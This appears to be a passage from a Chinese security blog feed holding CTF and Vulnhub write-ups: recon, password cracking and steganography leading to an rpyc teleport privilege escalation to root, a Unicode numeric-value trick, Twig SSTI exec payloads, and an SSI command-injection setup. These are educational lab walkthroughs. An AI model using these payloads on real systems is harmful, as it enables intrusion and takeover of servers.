<li><strong>二进制文件提取</strong></li>
<li><strong>素数查找/科拉茨猜想</strong></li>
<li><strong>RPC漏洞提权</strong></li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击主机（kali）：10.0.2.4</p>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.12</span><br><span class="line">sudo nmap -p22,80 -sV -sC 10.0.2.12</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410164330.png" /></p>
<ul>
<li>22端口上的服务是ssh</li>
<li>80端口上的服务是http，apache2.4.29</li>
<li>靶机的OS为Ubuntu</li>
<li>靶机的网站上有一个文件<code>/site/</code></li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>访问页面发现需要加载很长的时间，不知道什么原因。查看源码发现是该页面加载了一些外网的资源，导致加载速度慢。发现源码没有什么有用的信息。</p>
<p>查看页面内容，讲述的是维京人的故事，<em>领导者为了报杀父之仇从而进行了一场侵略，他的父亲是Ragnar</em>。除此之外，没有什么有用的信息了，下面的功能点都是假的。</p>
<p>接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br><span class="line"></span><br><span class="line">gobuster dir -u http://10.0.2.12/site/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<p>后者扫描到了了一个文件<code>war.txt</code>，而该网站主页面也描述的是战争，因此这个文件值得看。而其他的文件都是<code>images, css, js, index.hmtl</code>这些没有什么实质信息。</p>
<p>直接访问<code>war.txt</code>，内容是<code>/war-is-over</code>，这似乎是一个url路径，直接访问，得到一大串字符，粗略一看，发现可能是经过base64加密的内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172535.png" /></p>
<p>乍一看解码完反而更加的难理解了，但是仔细看最开始的PK。每种格式的文件头部信息都不同，而zip的文件的头部信息是<code>504B0304</code>，转为字符即为PK开头。</p>
<p><a
href="https://blog.csdn.net/Liukairui/article/details/105662668?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.pc_relevant_default&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=4">不同格式文件头部信息</a></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410172702.png" /></p>
<p>因此，初步认定该数据是经过了压缩之后的数据，并且压缩方式可能是zip。也可以利用cyberchef的entro模块。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173101.png" /></p>
<p>也说明了这很有可能就是压缩后的数据，然后使用<code>detect file type</code>模块分析一下具体的格式</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173826.png" /></p>
<p>因此直接将这串数据保存为zip文件。然后解压，发现需要密码。直接利用<code>john</code>爆破。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410173301.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john a.zip &gt; <span class="built_in">hash</span></span><br><span class="line">john <span class="built_in">hash</span> --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
<p>破解得到密码为<code>ragnarok123</code>。直接解压得到一张图片<code>king</code>。点开发现图片没有什么特别的，那有没有可能信息被藏起来了，这是CTF中常考的“隐写术”。</p>
<h2 id="隐写术">隐写术</h2>
<p>隐写术探测及数据提取 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info [filename]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line"><span class="comment"># 破解一个小时都破解不出来</span></span><br></pre></td></tr></table></figure></p>
<p>直接提取二进制文件的信息 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -B filename # 分析</span><br><span class="line">binwalk -e filename # 提权</span><br></pre></td></tr></table></figure></p>
<p>隐写术探测 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide info king</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174008.png" /></p>
<p>发现还需要密码。此时有两个选择</p>
<ol type="1">
<li>暴力破解密码</li>
<li>直接提取二进制文件的信息</li>
</ol>
<p>暴力破解可以用如下代码（时间长，还不一定能得到结果）：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(cat <span class="string">&quot;rockyou.txt&quot;</span>); <span class="keyword">do</span> steghide extract [filename] -p <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
<p>这里采用第二种办法 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -B filename <span class="comment"># 分析</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174214.png" /></p>
<p>注意第三行，存在被压缩的数据，格式、大小、文件名都分析出来了。输入下述命令，提取<code>king</code>中的二进制文件，得到一个文件夹<code>_king.extracted</code>，里面有两个文件，一个是<code>zip</code>一个是解压后的文件<code>user</code>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e filename <span class="comment"># 提取</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410174641.png" /></p>
<p>直接读取<code>use</code>中的信息，获得如下信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//FamousBoatbuilder_floki@vikings    # 伟大的造船家 floki                                 </span><br><span class="line">//f@m0usboatbuilde7</span><br></pre></td></tr></table></figure></p>
<p>这两行信息特别想登录<code>ssh</code>的时候输入的命令。因此，用各种组合尝试一下登录。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: FamousBoatbuilder_floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: FamousBoatbuilder</span><br><span class="line">passwoed: f@m0usboatbuilde7</span><br><span class="line"></span><br><span class="line">username: floki</span><br><span class="line">passwoed: fFamousBoatbuilder</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>直接使用第二组登录成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175037.png" /></p>
<h2 id="信息收集">信息收集</h2>
<p>先尝试了一下<code>sudo -l</code>发现没有任何权限。又尝试了一下<code>cat /etc/passwd</code>，发现存在一个用户<code>ragnar</code>，这个单词一直出现，因此，我们下一步需要提权为<code>ragnar</code>。</p>
<p>查看了一下<code>/etc/ragnar</code>下，发现有一个<code>user.txt</code>文件，这应该就是flag文件。读取其中的内容，得到第一个flag
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4bf930187d0149a9e4374a4e823f867d</span><br></pre></td></tr></table></figure></p>
<p>查看了一下当前目录下有什么文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410175315.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readme.txt中的内容：</span><br><span class="line">___________________Floki-Creation_________________________</span><br><span class="line"></span><br><span class="line">I am the famous boat builder Floki. We raided Paris this with our all might yet we failed. We don&#x27;t know where Ragnar is after the war. He is in so grief right now. I want to apologise to him.</span><br><span class="line">Because it was I who was leading all the Vikings. I need to find him. He can be anywhere. </span><br><span class="line">I need to create this `boat` to find Ragnar</span><br></pre></td></tr></table></figure>
<p>意思就是<em>他是一个伟大的造船家，维京人挑起了与巴黎的战争，但是结果失败了，并且Ragnar也失踪了，他很自责，想要找回Ragnar，他需要创造
<strong>boat</strong>去找Ragnar</em>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">boat中的内容：</span><br><span class="line">#Printable chars are your ally.</span><br><span class="line">#num = 29th prime-number.</span><br><span class="line">collatz-conjecture(num)</span><br></pre></td></tr></table></figure>
<p>注释为<em>可打印的字符是你的盟友</em>。下面两行是一个伪代码，意思是先找到第29个质数，然后带入<code>collatz-conjecture</code>函数。经过搜索发现，这是一个数学猜想。</p>
<blockquote>
<p><strong>冰雹猜想</strong>：一个正整数x，如果是奇数就乘以3再加1，如果是偶数就除以2，这样经过若干个次数，最终回到1。</p>
</blockquote>
<p>推测：该猜想的过程中每一步都会生成一个新的数，直到为1。然后数字可以认为是字符的ascii码。因此我们：</p>
<ol type="1">
<li>找到第29个质数；</li>
<li>通过冰雹猜想，找出每一步的结果；</li>
<li>将结果转为字符</li>
<li>找出其中的<strong>可打印字符</strong></li>
</ol>
<blockquote>
<p>基本的 ASCII 字符集共有 128 个字符，其中有 95
个可打印字符，包括常用的字母、数字、标点符号等，另外还有 33 个控制字符。
在ASCII码中，<strong>第0～31号及第127号(共33个)，换句话说就是小于32的</strong>都是控制字符或通讯专用字符。<strong>第32~126号(共95个)是可打印字符</strong>，也就是在显示器上输出能够看得见的。</p>
</blockquote>
<h2 id="素数查找冰雹猜想">素数查找/冰雹猜想</h2>
<p>根据上面描述，编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeNumber</span>():</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> count():</span><br><span class="line">        <span class="keyword">if</span> x &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        NotPrime = <span class="number">0</span></span><br><span class="line">        h = x // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, h):</span><br><span class="line">            <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">                NotPrime = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> NotPrime:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(n) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(x))</span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">29</span>:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collatz</span>(<span class="params">num</span>):</span></span><br><span class="line">    passwd = <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            num = num // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="number">3</span> * num + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt;= num &lt;= <span class="number">126</span>:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> passwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(collatz(primeNumber()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>运行得到如下结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203036.png" /></p>
<p>最后一行就是全部可打印的字符 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mR)|&gt;^/Gky[gz=\.F#j5P(</span><br></pre></td></tr></table></figure></p>
<h2 id="本地提权rpc提权">本地提权——RPC提权</h2>
<p>尝试使用刚刚得到的字符登录<code>ragnar</code>账号</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203119.png" /></p>
<p>成功登录。如果使用<code>ssh</code>连接，则会出现这样的情况，再次让我们输入密码。奇怪的是为什么刚刚登录却还需要再次输入密码？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203550.png" /></p>
<p>输入密码后提示<code>ragnar is not in the sudoers file.  This incident will be reported.</code>，也就是我们没有执行<code>sudo</code>的权限。</p>
<blockquote>
<p><code>/bin/sh</code>转为<code>/bin/bash</code>命令：<code>/bin/bash</code></p>
</blockquote>
<p>综上分析，一定是执行了<code>sudo command</code>，所以才需要输入密码，但是我们只是刚刚登录，所以一定是登录自启动！当命令存储在用户配置文件中时会发生这种情况。（这应该是作者给的提示，如果直接<code>su ragnar</code>则不会有这提示）接下来就去找自启动的配置文件，一般有：</p>
<blockquote>
<p>针对用户：<code>/home/username/.bashrc, /home/username/.profile</code>等
全局：<code>/etc/profile</code></p>
</blockquote>
<p>最后再<code>/etc/ragnar/.profile</code>中发现</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204219.png" /></p>
<p>查看该文件的权限</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204434.png" /></p>
<p>发现这个文件是属于root用户，其他用户都可以运行这个文件，但是其他用户没有修改权限。</p>
<p>既然它是服务端开放的一个api接口，我们可以在客户端编写程序代码，通过某些函数提交到服务器端的侦听端口上面，然后让服务器进行执行，服务器是通过root权限执行的，如果我们可以控制这些提交上去的函数使其执行我们的代码，我们就可以获得root权限。</p>
<p>参考链接: <a
href="https://rpyc.readthedocs.io/en/latest/index.html">rypc</a></p>
<p>从官网中找到一个方法<code>teleport</code>，该方法允许客户端向服务端传输一个方法，并且在服务端执行该方法，并且官网也给出了这个方法的简单应用。也就是我们可以利用该方法去传输一个自己写的方法用来提权，比如把<code>ragnar</code>加入到sudo组。</p>
<p>将官网给的例子简单修改： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">	<span class="keyword">import</span> os</span><br><span class="line">	os.system(<span class="string">&quot;sudo usermod -a -G sudo ragnar&quot;</span>)</span><br><span class="line">fn = conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a: append, 添加</span><br><span class="line">-G: Group, 组</span><br><span class="line">-a -G sudo: 加入到sudo组</span><br></pre></td></tr></table></figure>
<p>执行该程序，然后重新连接一下<code>ragnar</code>，然后用<code>sudo -s</code>，以root执行shell。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410205645.png" /></p>
<p>成功拿到root权限。然后读取<code>/root</code>下的flag文件即可。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f0b98d4387ff6da77317e582da98bf31</span><br></pre></td></tr></table></figure></p>
<p>这里的RPC提权还有其他的利用方式，比如在自己的主机生成公私钥，然后在靶机上创建<code>/root/.ssh</code>，并把私钥复制进去，之后就能使用公钥登录；还可以利用<code>rypc</code>的eval
和 execute 方法直接反弹shell。</p>
<p>我整理一下：</p>
<ol type="1">
<li>我们登录到ragnar用户；<br />
</li>
<li>ragnar自启动该程序，并执行我们的添加普通用户到sudo组的命令<br />
</li>
<li>获得sudo权限</li>
</ol>
<p>问题：ragnar应该没有权限执行添加普通用户到sudo组的命令吧？</p>
<p>解答：</p>
<p>其实只要开机，该脚本都会执行，因为该脚本的开机自启动写在了<code>/etc/init.d/rpyc</code>中。而<code>/home/ragnar/.profile</code>应该只是写出来给我们一个提示！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410214605.png" /></p>
<p>原本的执行权限为<code>755</code>。我将它修改为<code>744</code>，然后重新启动，发现该脚本还是被执行了，又因为ragnar没有sudo权限无法执行，所以只有可能被root执行。也就是说，无论登录的是哪个用户，只要这台靶机开机，该脚本都会以root权限执行，那么自然就能够执行添加普通用户到sudo组的命令了。</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透，学到了一下新的知识点：</p>
<ol type="1">
<li>二进制信息查看</li>
<li>隐写术知识点</li>
<li>rpyc提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>隐写术</tag>
        <tag>二进制信息查看</tag>
        <tag>rypc提权</tag>
      </tags>
  </entry>
  <entry>
    <title>ASIS 2019 Unicorn shop</title>
    <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408193908.png" /></p>
<p>发现下面有两个输入框，第一个是<code>Item ID</code>，第二个是<code>Price</code>。经过测试，如果我们输入正确的Item
ID，会提示<code>Wrong commodity!</code>，如果输入不正确的Item
ID，则会提示<code>No commodity found!</code>。<code>Price</code>框只允许输入一个字符。</p>
<h1 id="解题">解题</h1>
<p>最开始不知道这道题考点是什么，查看别人的wp之后发现了是<strong>Unicode编码</strong>。</p>
<p>下面是该题目的源码中关于<code>Price</code>的重要代码：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">price = urllib.unquote(price).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">unicodedate.numeric(price)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>解释：先是将我们输入的price进行url解码，然后取出字符对应的<code>numeric value</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unicodedata.numeric(<span class="built_in">chr</span>[, default])</span><br></pre></td></tr></table></figure>
<p>把分配给字符chr的数值转换为浮点数并返回。比如可以将“四”转为4.0，“8”转为8.0等。不仅仅只局限于0-9的字符，只要是合法的字符都可以，如果是不合法的字符就会报错<code>ValueError</code>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408194554.png" /></p>
<p>那么字符对应的<code>numeric value</code>又是什么呢？这里推荐一个网站<a
href="https://www.compart.com/en/unicode/">compact</a></p>
<p>我们选择一个字符查看信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195131.png" /></p>
<p>会发现该字符有一个<code>Numeric Value</code>，但并不是每一个字符都有，比如下面这个就没有</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195227.png" /></p>
<p>到此就很清晰了，我们输入的字符的<code>Numeric Value</code>要大于商品的价格，就可以获得flag了。</p>
<p>这里有四个商品，但是前三个商品的价格都不大与9，如果是要购买前三个商品的话，完全就用不到<code>numeric value</code>。经过测试发现，前三个即使价格足够也会提示<code>Wrong commodity</code>，那么就一定是最后一个了。因此，我们需要输入一个字符，这个字符的<code>numeric value</code>要大于1337。可以通过刚刚那个网站搜索thousand然后慢慢找即可。</p>
<p>这里我用“万”（当然“亿”也可以）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195716.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195731.png" /></p>
<p>成功获得flag。</p>
<h1 id="总结">总结</h1>
<p>本题给我的感觉更像是杂项。不过我也通过该题学到了字符拥有<code>Numeric Value</code>这个属性。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Unicode</tag>
        <tag>Numeric Value</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF20 Cookie is so stable</title>
    <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a
href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>首先注意到本题的题目是“Cookie is so
stable”，说明该题应该跟cookie相关。提到cookie，一般有以下思路：</p>
<ul>
<li>利用cookie来伪装成管理员或者其他账号</li>
<li>利用cookie进行注入，比如sql注入</li>
</ul>
<p>进入环境，首先查看了源码，发现了三个文件</p>
<ol type="1">
<li><code>index.php</code></li>
<li><code>flag.php</code></li>
<li><code>hint.php</code></li>
</ol>
<p>依次进行了查看，index.php就是进入环境看到的界面；hint.php源码中有一句提示<code>Why not take a closer look at cookies?</code>；flag.php
界面有一个输入框，猜测这里输入，然后cookie就会被设置为对应的值。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091727.png" /></p>
<h1 id="解题">解题</h1>
<p>输入admin之后，还以为其他界面会发生变化，结果跟原来一样。抓包看看，发现cookie中确实多了
<code>user=admin</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091854.png" /></p>
<p>起初，我还以为是要猜admin的cookie值，就把0，1，admin，root，administrator等都试了一遍，发现没有任何变化。</p>
<p>然后我想到了sql注入，尝试了一下发现无论输入什么也没有报错，单引号、双引号，括号都无法闭合。因此，就放弃了sql注入。</p>
<p>最后的最后，想到了还有一种注入，那就是模板注入——SSTI。所以将<code>user=&#123;&#123;7*7&#125;&#125;</code>带入，发现成功被执行！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092245.png" /></p>
<p>因此，接下来就需要判断以下模板引擎是什么，根据决策树</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>此时<code>&#123;&#123;7*7&#125;&#125;</code>已经成功被执行，此时需要走绿线，尝试<code>&#123;&#123;7*'7'&#125;&#125;</code>，如果结果为<code>49</code>则是Twig，如果结果是<code>7777777</code>，则是Jinjia2。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092437.png" /></p>
<p>因此，模板引擎为Twig。</p>
<p><strong>Twig有三个版本
1.x，2.x，3.x，三者的主要区别就是<code>_self</code>作用发生了变化</strong>。因此，使用如下payload判断一下版本。可以参考一下：<a
href="https://hdfzzf.icu/2022/04/05/Twig模板注入/">Twig模板注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092951.png" /></p>
<p>成功被执行，因此Twig版本为1.x 。</p>
<p>接下来就很简单了，使用如下payload查看根目录 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `ls /`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意的是不能直接
<code>ls /</code>，这样子只能返回一行结果，而根目录下的文件或目录有很多，我们需要知道全部以确定flag是否在。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093154.png" /></p>
<p>找到flag。接下来读取 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `cat /flag`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093236.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<p>本题考察的主要是模板注入中的Twig模板引擎，主要的难点就是<strong>区分模板引擎</strong>。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Twig SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <url>/2022/04/19/BJDCTF2020%20EasySearch/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">EasySearch</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后，看到的就是一个登陆界面，查看源码、抓包都没有任何有用的信息，尝试对登陆界面进行SQL注入也没有结果。所以打算进行路径扫描，结果如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 index.php </span><br><span class="line">200 index.php/login</span><br><span class="line">403 /public/  </span><br><span class="line">403 /server-status</span><br><span class="line">403 /server-status/</span><br><span class="line">403 /cgi-bin/</span><br></pre></td></tr></table></figure></p>
<p>最开始还以为是403
Bypass，但是经过尝试，发现行不通。最后实在没办法去查看了一下别人的WP，发现原来的题目是有提示的，就是<strong>访问<code>index.php.swp</code></strong>。访问该文件，得到如下源码：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];  <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>通过代码审计，发现能够利用的就是<code>fwrite($shtml,$text);</code>，将我们输入的username写入文件。通过搜索发现shtml文件可以执行bash命令，格式如下：<code>&lt;!--#exec cmd='[命令]'--&gt;</code>。只需要访问带有对应格式的shtml文件，即可执行文件中的命令。</p>
